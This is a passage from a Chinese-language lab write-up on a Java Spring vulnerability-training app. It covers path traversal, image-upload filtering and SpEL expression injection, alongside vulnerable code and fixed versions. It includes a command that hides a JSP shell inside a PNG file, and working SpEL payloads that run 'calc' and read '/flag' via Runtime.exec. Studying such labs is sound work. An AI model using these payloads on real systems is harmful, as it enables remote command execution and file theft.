<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/path_traversal/sec"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getImageSec</span><span class="token punctuation">(</span><span class="token class-name">String</span> filepath<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">SecurityUtil</span><span class="token punctuation">.</span><span class="token function">pathFilter</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Illegal file path: "</span> <span class="token operator">+</span> filepath<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            <span class="token keyword">return</span> <span class="token string">"Bad boy. Illegal file path."</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">return</span> <span class="token function">getImgBase64</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>pathfileter 过滤器的内容为：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">pathFilter</span><span class="token punctuation">(</span><span class="token class-name">String</span> filepath<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token class-name">String</span> temp <span class="token operator">=</span> filepath<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token comment">// use while to sovle multi urlencode</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">while</span> <span class="token punctuation">(</span>temp<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token char">'%'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>                temp <span class="token operator">=</span> <span class="token class-name">URLDecoder</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">UnsupportedEncodingException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>                logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Unsupported encoding exception: "</span> <span class="token operator">+</span> filepath<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>                logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>temp<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span> <span class="token operator">||</span> temp<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">return</span> filepath<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这个代码过滤的是 linux 里面的内容，windows 是以盘符开始的路径，防不住 windows 的文件</p>
<h2 id="文件上传-2"><a class="anchor" href="#文件上传-2">#</a> 文件上传</h2>
<p>直接看 sec 修复代码：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/upload/picture"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token annotation punctuation">@ResponseBody</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">uploadPicture</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span> <span class="token class-name">MultipartFile</span> multifile<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>multifile<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            <span class="token keyword">return</span> <span class="token string">"Please select a file to upload"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token class-name">String</span> fileName <span class="token operator">=</span> multifile<span class="token punctuation">.</span><span class="token function">getOriginalFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token class-name">String</span> <span class="token class-name">Suffix</span> <span class="token operator">=</span> fileName<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>fileName<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取文件后缀名</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token class-name">String</span> mimeType <span class="token operator">=</span> multifile<span class="token punctuation">.</span><span class="token function">getContentType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取 MIME 类型</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token class-name">String</span> filePath <span class="token operator">=</span> <span class="token constant">UPLOADED_FOLDER</span> <span class="token operator">+</span> fileName<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token class-name">File</span> excelFile <span class="token operator">=</span> <span class="token function">convert</span><span class="token punctuation">(</span>multifile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token comment">// 判断文件后缀名是否在白名单内  校验 1</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> picSuffixList <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">".jpg"</span><span class="token punctuation">,</span> <span class="token string">".png"</span><span class="token punctuation">,</span> <span class="token string">".jpeg"</span><span class="token punctuation">,</span> <span class="token string">".gif"</span><span class="token punctuation">,</span> <span class="token string">".bmp"</span><span class="token punctuation">,</span> <span class="token string">".ico"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">boolean</span> suffixFlag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> white_suffix <span class="token operator">:</span> picSuffixList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Suffix</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>white_suffix<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>                suffixFlag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>                <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>suffixFlag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"[-] Suffix error: "</span> <span class="token operator">+</span> <span class="token class-name">Suffix</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            <span class="token function">deleteFile</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            <span class="token keyword">return</span> <span class="token string">"Upload failed. Illeagl picture."</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token comment">// 判断 MIME 类型是否在黑名单内 校验 2</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> mimeTypeBlackList <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>                <span class="token string">"text/html"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="34"></td><td><pre>                <span class="token string">"text/javascript"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="35"></td><td><pre>                <span class="token string">"application/javascript"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="36"></td><td><pre>                <span class="token string">"application/ecmascript"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="37"></td><td><pre>                <span class="token string">"text/xml"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="38"></td><td><pre>                <span class="token string">"application/xml"</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> blackMimeType <span class="token operator">:</span> mimeTypeBlackList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>            <span class="token comment">// 用 contains 是为了防止 text/html;charset=UTF-8 绕过</span></pre></td></tr><tr><td data-num="42"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">SecurityUtil</span><span class="token punctuation">.</span><span class="token function">replaceSpecialStr</span><span class="token punctuation">(</span>mimeType<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>blackMimeType<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>                logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"[-] Mime type error: "</span> <span class="token operator">+</span> mimeType<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>                <span class="token function">deleteFile</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>                <span class="token keyword">return</span> <span class="token string">"Upload failed. Illeagl picture."</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="48"></td><td><pre></pre></td></tr><tr><td data-num="49"></td><td><pre>        <span class="token comment">// 判断文件内容是否是图片 校验 3</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token keyword">boolean</span> isImageFlag <span class="token operator">=</span> <span class="token function">isImage</span><span class="token punctuation">(</span>excelFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>        <span class="token function">deleteFile</span><span class="token punctuation">(</span>randomFilePath<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre></pre></td></tr><tr><td data-num="53"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isImageFlag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"[-] File is not Image"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>            <span class="token function">deleteFile</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>            <span class="token keyword">return</span> <span class="token string">"Upload failed. Illeagl picture."</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="58"></td><td><pre></pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>            <span class="token comment">// Get the file and save it somewhere</span></pre></td></tr><tr><td data-num="62"></td><td><pre>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> multifile<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>            <span class="token class-name">Path</span> path <span class="token operator">=</span> <span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token constant">UPLOADED_FOLDER</span> <span class="token operator">+</span> multifile<span class="token punctuation">.</span><span class="token function">getOriginalFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>            <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>            <span class="token function">deleteFile</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>            <span class="token keyword">return</span> <span class="token string">"Upload failed"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="70"></td><td><pre></pre></td></tr><tr><td data-num="71"></td><td><pre>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;"</span><span class="token punctuation">,</span> <span class="token class-name">Suffix</span><span class="token punctuation">,</span> mimeType<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"[+] Successfully uploaded &#123;&#125;"</span><span class="token punctuation">,</span> filePath<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>        <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"You successfully uploaded '%s'"</span><span class="token punctuation">,</span> filePath<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>图片才能绕过，但也可以通过</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>copy <span class="token number">1</span>.png/shell.jsp muma.png</pre></td></tr></table></figure><h2 id="spel表达式注入漏洞"><a class="anchor" href="#spel表达式注入漏洞">#</a> SpEL 表达式注入漏洞</h2>
<p>Spring Expression Language (简称 SpEl) 是一种强大的表达式语言，支持在运行时查询和操作对象图，语言语法类似于 Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串木模板功能，因为 SpEL 的功能强大允许在表达式中动态调用方法</p>
<h3 id="路由spelvuln1"><a class="anchor" href="#路由spelvuln1">#</a> 路由 /spel/vuln1</h3>
<p>漏洞代码：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/spel/vuln1"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">spel_vuln1</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token keyword">return</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>可以通过 spel 表达式实现命令执行</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>也可以</p>
<pre><code>T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)
</code></pre>
<p>直接执行命令</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">new</span><span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"cat%20/flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"%5C%5C%5CA"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507241824777.png" alt="image-20250724182402551" /></p>
<h3 id="路由spelvuln2"><a class="anchor" href="#路由spelvuln2">#</a> 路由 /spel/vuln2</h3>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"spel/vuln2"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">spel_vuln2</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token class-name">StandardEvaluationContext</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StandardEvaluationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token class-name">SpelExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token class-name">Expression</span> expression <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TemplateParserContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token class-name">Object</span> x <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// trigger vulnerability point</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">return</span> x<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// response</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>在第一关上加上了一个模板引擎，用 ${} 套上就好了</p>
<p>payload:</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>$<span class="token punctuation">&#123;</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token char">'calc'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span><span class="token number">7</span>Bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>cat<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">2F</span>flag<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">5</span>C<span class="token operator">%</span><span class="token number">5</span>C<span class="token operator">%</span><span class="token number">5</span><span class="token constant">CA</span><span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7D</span></pre></td></tr></table></figure><p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507241935970.png" alt="image-20250724193511596" /></p>
<p>漏洞修复：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"spel/sec"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">spel_sec</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token class-name">SimpleEvaluationContext</span> context <span class="token operator">=</span> <span class="token class-name">SimpleEvaluationContext</span><span class="token punctuation">.</span><span class="token function">forReadOnlyDataBinding</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token class-name">SpelExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token class-name">Expression</span> expression <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TemplateParserContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token class-name">Object</span> x <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">return</span> x<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token 